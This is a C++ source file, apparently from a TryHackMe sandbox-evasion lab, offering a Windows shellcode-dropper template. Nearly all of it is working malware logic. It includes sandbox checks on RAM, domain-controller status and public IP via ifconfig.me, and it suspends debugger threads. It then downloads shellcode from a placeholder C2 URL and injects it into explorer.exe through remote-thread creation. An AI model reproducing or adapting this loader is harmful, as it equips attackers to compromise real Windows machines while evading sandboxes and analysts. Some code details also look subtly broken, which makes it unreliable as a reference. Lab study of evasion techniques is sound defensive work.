/***********************************************************************
/   Simple Shellcode-dropper template for Windows x64 Architecture
/   used in the THM Sandbox evasion Room. For educational purpose only.
/
/   TODO: implement common sandbox evasion techniques.
/   ADDED: memory checker, Windows DC check, IP address checker, sleep timer.
/   ADDED: very basic anti-debugging functionality.
/
************************************************************************/
#include <iostream>
#include <Windows.h>
#include <tlhelp32.h>
#include <locale>
#include <string>
#include <urlmon.h>
#include <cstdio>
#include <lm.h>
#include <DsGetDC.h>
#pragma comment(lib, "urlmon.lib")

using namespace std;

// Update SHELLCODE_SIZE with your shellcode size in bytes. This should be approximately 510 bytes. 
const int SHELLCODE_SIZE = 510;
// PID of Explorer.exe for use in OpenProcess() API call. Find this using Windows Task Manager or Process Explorer.
const int EXPLORER_PID = 5780;
// IP address of your target:
const char* TARGET_IP = "10.10.119.64";
// If a debugger is found, this is used to store the corresponding PID...
DWORD g_dwDebuggerProcessId = -1;

bool memoryCheck() {
    // Check memory size. Most sandboxes use low specs to limit the impact on the host system.
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);
    GlobalMemoryStatusEx(&statex);
    // Check if more then 2GB. Adjust this to your meet your requirements.
    if (statex.ullTotalPhys / 1024 / 1024 / 1024 >= 2.00) {
        return true;
    }
    else {
        return false;
    }
}

bool CALLBACK EnumWindowsProc(HWND hwnd, LPARAM dwProcessId)
{
    // Itterate over all windows and look for "dbg" or "debugger" in the window title
    DWORD dwWindowProcessId;
    GetWindowThreadProcessId(hwnd, &dwWindowProcessId);

    if (dwProcessId == dwWindowProcessId)
    {
		int windowTitleSize = GetWindowTextLengthW(hwnd);
		if ( windowTitleSize <= 0 )
		{
			return true;
		}
		wchar_t* windowTitle = (wchar_t*)malloc((windowTitleSize + 1) * sizeof(wchar_t));
		
        GetWindowTextW(hwnd, windowTitle, windowTitleSize + 1);

		if (wcsstr(windowTitle, L"dbg") != 0 ||
			wcsstr(windowTitle, L"debugger") != 0 )
		{
            // Looks like we found a debugger running! Let's remember the PID.
            g_dwDebuggerProcessId = dwProcessId;
			return false;
		}
 
       return false;
    }

    return true;
}

DWORD IsDebuggerProcess(DWORD dwProcessId)
{
    EnumWindows(EnumWindowsProc, (LPARAM)dwProcessId);
    return g_dwDebuggerProcessId == dwProcessId;
}

DWORD SuspendDebuggerThread()
{
    // Use SuspendThread() to suspend the running debugger, ruining someones day.
    // Sadly this can be patched quick&dirty by changing any SuspendThread() calls to 0x90h (NOP) instructions.
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
	{
        printf("Failed to create snapshot\n");
        return 1;
    }

    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);

    if (!Thread32First(hSnapshot, &te32))
	{
        printf("Failed to get first thread\n");
        CloseHandle(hSnapshot);
        return 1;
    }

    do
	{
        HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION | THREAD_SUSPEND_RESUME, FALSE, te32.th32ThreadID);
        if (hThread != NULL)
		{
            DWORD dwProcessId = GetProcessIdOfThread(hThread);
			if ( IsDebuggerProcess(dwProcessId) )
			{
                // Remove this from production code.
				printf("[INFO] We have Debugger with pid %i! Suspending!\n", dwProcessId);
				DWORD result = SuspendThread(hThread);
 				if ( result == -1 )
				{
					printf("Last error: %i\n", GetLastError());
				}
			}
            CloseHandle(hThread);
        }
    } while (Thread32Next(hSnapshot, &te32));

    CloseHandle(hSnapshot);

    return 0;
}

bool isDomainController() {
    // Windows sandboxes are usually not configured as AD Domain Controller, so let's check...
    // (Only useful if you _know_ your target is a DC)
    LPCWSTR dcName;
    string dcNameComp;
    NetGetDCName(NULL, NULL, (LPBYTE*)&dcName);
    wstring ws(dcName);
    string dcNewName(ws.begin(), ws.end());
    cout << dcNewName;
    if (dcNewName.find("\\\\")) {
        return false;
    }
    else {
        return true;
    }
}

bool checkIP() {
    // Check if our dropper got shipped off to an offsite-sandbox...
    // Let's find out this machine's IP by using ifconfig.me:
    const char* websiteURL = "https://ifconfig.me/ip";
    IStream* stream;
    string s;
    char buff[35];
    unsigned long bytesRead;
    // Get the public facing IP address:
    URLOpenBlockingStreamA(0, websiteURL, &stream, 0, 0);
    while (true) {
        stream->Read(buff, 35, &bytesRead);
        if (0U == bytesRead) {
            break;
        }
        s.append(buff, bytesRead);
    }
    // Compare the results:
    if (s == TARGET_IP) {
        // All looks good! We are running on the target.
        return true;
    }
    else {
        // we are running probably offsite in a sandbox!
        return false;
    }
}

int downloadAndExecute() {
    // Download a shellcode via HTTP and execute.
    HANDLE hProcess;
    SIZE_T dwSize = SHELLCODE_SIZE;
    DWORD flAllocationType = MEM_COMMIT | MEM_RESERVE;
    DWORD flProtect = PAGE_EXECUTE_READWRITE;
    LPVOID memAddr;
    SIZE_T bytesOut;
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, EXPLORER_PID);

    // Update the c2URL with your IP address and the specific URI where your raw shellcode is stored.
    const char* c2URL = "http://yourc2server/shellcode.raw";
    
    IStream* stream;
    char buff[SHELLCODE_SIZE];
    unsigned long bytesRead;
    string s;
    // Open URL stream and download payload.
    URLOpenBlockingStreamA(0, c2URL, &stream, 0, 0);
    while (true) {
        stream->Read(buff, SHELLCODE_SIZE, &bytesRead);
        if (0U == bytesRead) {
            break;
        }
        s.append(buff, bytesRead);
    }
    // Allocate memory...
    memAddr = VirtualAllocEx(hProcess, NULL, dwSize, flAllocationType, flProtect);
    WriteProcessMemory(hProcess, memAddr, buff, dwSize, &bytesOut);
    // ...and execute our payload.
    CreateRemoteThread(hProcess, NULL, dwSize, (LPTHREAD_START_ROUTINE)memAddr, 0, 0, 0);
    stream->Release();
    return 0;
}

int main() {
    // Look for debugger and SuspendThread() it...
    SuspendDebuggerThread();

    // Try to sleep through sandbox...
    sleep(300); // sleep_timer in seconds, about 5 min should be realistic tho...
    
    // Only drop and run our payload if we are not sandboxed (-anymore-)...
    if ((memoryCheck() == true) && (isDomainController() == true) && (checkIP() == true)) {
        downloadAndExecute();
    }
    else {
        return 0;
    }

    return 0;
}